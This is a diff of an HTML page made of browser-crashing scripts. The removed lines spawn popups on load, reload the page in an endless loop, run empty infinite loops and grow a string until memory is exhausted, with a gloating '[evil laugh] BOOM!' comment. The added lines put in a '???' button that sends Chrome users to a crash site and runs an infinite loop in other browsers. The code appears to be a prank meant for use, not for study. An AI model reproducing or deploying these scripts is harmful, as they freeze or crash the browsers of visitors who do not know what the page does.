@@ -1,34 +1,16 @@
-
-<script>
-  <script type="text/javascript"> 
-function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222') }
-</script> 
-<body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
-  </script>
-<script>
-   setTimeout(function(){
-    while(1)location.reload(1)
-  }, 1000)
-  </script>
-<script>
-  for(var i = 0; i === i; i++) {}
-  </script>
-
-<script>
-  onbeforeunload = function(){localStorage.x=1};
-  while(1)location.reload(1)
-  </script>
-<script>
-      while(true) {
-       for(let i = 99; i === i; i *= i) {
-          console.log(i);
-       };
-    };
-  </script>
-<script>
-  txt = "a";
-while(1){
-    txt = txt += "a";    //add as much as the browser can handle
+<button onclick="crash()">???</button>
+    <script type="text/javascript">
+function crash(){
+  if(navigator.userAgent.indexOf("Chrome") != -1 )
+    {
+      alert('WHoops')
+window.open('http://crashchrome.com/', '_self', '');
+    }
+    else {
+      alert('Hehe')
+      while (1==1){
+        console.log(3234567654*45671234567890987654321)
+      }
+    }
 }
-//[evil laugh] BOOM! All memory used up, and it is now CRASHED!
-  </script>
+</script>
